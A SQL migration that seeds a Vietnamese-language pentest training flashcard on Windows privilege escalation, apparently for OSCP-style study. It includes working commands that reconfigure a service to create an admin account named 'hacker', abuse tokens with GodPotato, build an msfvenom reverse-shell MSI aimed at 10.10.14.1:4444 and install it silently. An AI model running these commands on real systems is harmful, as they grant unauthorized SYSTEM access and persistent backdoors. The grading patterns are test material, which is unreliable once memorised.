-- 0077_lab_windows_services_token_elevation: new typed-command lab for the
-- pentest "labs" deck, covering what Lab 20 (recon + PrintSpoofer +
-- accesschk query only) and the cheat sheet didn't drill: wmic service
-- enum, Unquoted Service Path reasoning, PowerUp.ps1, the actual Insecure
-- Service Permissions exploit (sc config binpath= + restart), GodPotato,
-- AlwaysInstallElevated (msfvenom+msiexec), and Scheduled Tasks+icacls —
-- matching the 5-stage roadmap the learner shared for this room.

INSERT INTO cards (deck_id, kind, front, payload, source)
SELECT d.id, 'lab', c.front, c.payload::jsonb, 'seed'
FROM (VALUES
  ('Lab 34 — Windows Services, Token & AlwaysInstallElevated privesc', '{"scenario": "Đã có shell local low-priv trên Windows. whoami /priv và systeminfo (Lab 20) chưa thấy gì rõ ràng. Đào sâu vào service, registry, scheduled task và chính sách cài đặt phần mềm.", "steps": [{"prompt": "Liệt kê toàn bộ service kèm đường dẫn thực thi và chế độ khởi động, để soi dịch vụ chạy quyền cao nhưng path đáng ngờ.", "hint": "wmic service get name,displayname,pathname,startmode", "type": "command", "patterns": ["wmic\\s+service\\s+get\\s+name,displayname,pathname,startmode"], "explanation": "Cột PathName là nơi soi 2 dấu hiệu: Unquoted Service Path (path có khoảng trắng không để trong ngoặc kép) và service chạy SYSTEM nhưng path nằm trong thư mục user ghi được."}, {"output": "PathName: C:\\Program Files\\Some App\\service.exe   (không có dấu ngoặc kép bao quanh)", "prompt": "wmic cho 1 dòng path kiểu trên, KHÔNG có ngoặc kép bao quanh (Unquoted Service Path). Nếu ghi được vào C:\\Program Files\\, nên đặt payload ở đâu để Windows thực thi NHẦM?", "type": "choice", "choices": ["Tại C:\\Program.exe — Windows thử ngắt path tại TỪNG khoảng trắng theo thứ tự từ đầu, nên gặp C:\\Program.exe TRƯỚC khi thử tới path đầy đủ", "Tại C:\\Program Files\\Some App\\service.exe.exe — chỉ cần thêm đuôi .exe", "Không khai thác được nếu không ghi được chính file service.exe gốc"], "answer": 0, "explanation": "Windows parse 1 path không có ngoặc kép bằng cách thử NGẮT tại MỖI khoảng trắng, theo thứ tự từ trái qua — C:\\Program.exe luôn được thử TRƯỚC C:\\Program Files\\Some App\\service.exe."}, {"prompt": "Đẩy PowerUp.ps1 lên máy, chạy toàn bộ bộ kiểm tra tự động để liệt kê các vector privesc Windows phổ biến trong 1 lệnh (giả sử PowerUp.ps1 đã có sẵn trong thư mục hiện tại).", "hint": "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"", "type": "command", "patterns": ["PowerUp\\.ps1", "Invoke-AllChecks"], "explanation": "-ep bypass (ExecutionPolicy Bypass) cho phép chạy script .ps1 chưa ký — Invoke-AllChecks là hàm tổng hợp chạy MỌI check lẻ của PowerUp (service, registry, token, AlwaysInstallElevated...) cùng lúc."}, {"output": "SERVICE_NAME: VulnSvc\nBINARY_PATH_NAME: C:\\Services\\vulnsvc.exe\n... accesschk xác nhận user hiện tại có quyền SERVICE_CHANGE_CONFIG trên VulnSvc", "prompt": "accesschk xác nhận mình đổi được cấu hình service VulnSvc (chạy quyền SYSTEM). Đổi binPath của nó để tạo user admin mới khi service chạy.", "hint": "sc config VulnSvc binpath= \"net user hacker Passw0rd! /add && net localgroup administrators hacker /add\"", "type": "command", "patterns": ["sc\\s+config\\s+VulnSvc\\s+binpath="], "explanation": "PHẢI có đúng 1 khoảng trắng sau binpath= — thiếu là lỗi cú pháp ngay. Lệnh mới chỉ thực sự chạy khi service được start lại."}, {"prompt": "Restart service để binPath mới chạy với quyền SYSTEM của service.", "hint": "sc stop VulnSvc & sc start VulnSvc", "type": "command", "patterns": ["sc\\s+stop\\s+VulnSvc.*sc\\s+start\\s+VulnSvc", "sc\\s+start\\s+VulnSvc"], "explanation": "User hacker vừa tạo đã nằm trong nhóm administrators — đăng nhập lại (hoặc runas) bằng tài khoản đó là có quyền admin đầy đủ."}, {"prompt": "Trên Windows Server 2019/2022, PrintSpoofer hay bị vá/không chạy được. Dùng GodPotato thay thế để khai thác SeImpersonatePrivilege, chạy whoami để xác nhận SYSTEM.", "hint": "GodPotato -cmd \"whoami\"", "type": "command", "patterns": ["GodPotato\\s+-cmd"], "explanation": "GodPotato dùng kỹ thuật COM/RPC mới hơn JuicyPotato/PrintSpoofer, hoạt động ổn định trên các bản Windows gần đây nhất khi 2 công cụ kia bị vá."}, {"prompt": "PrintSpoofer, GodPotato và JuicyPotato đều khai thác CÙNG 1 lỗ hổng gốc nào?", "type": "choice", "choices": ["SeImpersonatePrivilege (hoặc SeAssignPrimaryTokenPrivilege) — khác nhau ở kỹ thuật COM/RPC bên dưới để phù hợp từng bản Windows", "Mỗi tool khai thác 1 CVE hoàn toàn khác nhau, không liên quan gì tới nhau", "Cả 3 đều cần biết trước mật khẩu admin"], "answer": 0, "explanation": "Cả 3 đều lợi dụng token có quyền SeImpersonatePrivilege để mạo danh 1 token SYSTEM có sẵn trong hệ thống qua COM server giả — chỉ khác cách giả mạo COM/RPC để tương thích từng bản Windows."}, {"prompt": "Kiểm tra chính sách AlwaysInstallElevated ở nhánh HKLM — nếu CẢ HKLM lẫn HKCU đều = 1 thì mọi user cài .msi với quyền SYSTEM.", "hint": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "type": "command", "patterns": ["reg\\s+query\\s+HKLM.*AlwaysInstallElevated"], "explanation": "Thiếu MỘT trong 2 key (HKLM hoặc HKCU) thì kỹ thuật này không hoạt động — luôn kiểm tra cả 2 trước khi tạo payload."}, {"prompt": "Cả 2 key đều = 1. Tạo file .msi chứa reverse shell bằng msfvenom (LHOST 10.10.14.1, cổng 4444).", "hint": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o evil.msi", "type": "command", "patterns": ["msfvenom\\s+-p\\s+windows.*-f\\s+msi\\s+-o\\s+evil\\.msi"], "explanation": "-f msi xuất đúng định dạng Windows Installer — định dạng khác (vd .exe) sẽ không kích hoạt được qua msiexec."}, {"prompt": "Chuyển evil.msi lên máy target rồi cài ngầm (không hiện UI) để kích hoạt payload với quyền SYSTEM.", "hint": "msiexec /quiet /qn /i evil.msi", "type": "command", "patterns": ["msiexec\\s+/quiet\\s+/qn\\s+/i\\s+evil\\.msi"], "explanation": "/quiet /qn chạy hoàn toàn ngầm — msi LUÔN được cài với quyền SYSTEM khi AlwaysInstallElevated bật, bất kể ai chạy msiexec, đó chính là lỗ hổng."}, {"prompt": "Không có AlwaysInstallElevated? Liệt kê toàn bộ Scheduled Task kèm user chạy, để tìm task SYSTEM mà file thực thi ghi được.", "hint": "schtasks /query /fo LIST /v", "type": "command", "patterns": ["schtasks\\s+/query\\s+/fo\\s+LIST\\s+/v"], "explanation": "Cột \"Run As User\" cho biết task nào chạy quyền SYSTEM — kết hợp icacls trên file thực thi của task đó để biết có ghi được hay không."}, {"prompt": "Tìm thấy 1 task SYSTEM trỏ tới C:\\Tasks\\backup.exe. Kiểm tra quyền ghi trên file đó trước khi thay thế bằng payload.", "hint": "icacls C:\\Tasks\\backup.exe", "type": "command", "patterns": ["icacls"], "explanation": "icacls liệt kê ACL chi tiết — dòng có (F) Full control hoặc (M) Modify gắn với user/group hiện tại nghĩa là ghi được, cùng tư duy với ls -la trên Linux."}], "difficulty": "nang_cao", "cert_tags": ["THM PT1", "OSCP"]}')
) AS c(front, payload)
JOIN decks d ON d.slug = 'labs'
  AND d.subject_id = (SELECT id FROM subjects WHERE slug = 'pentest')
ON CONFLICT DO NOTHING;
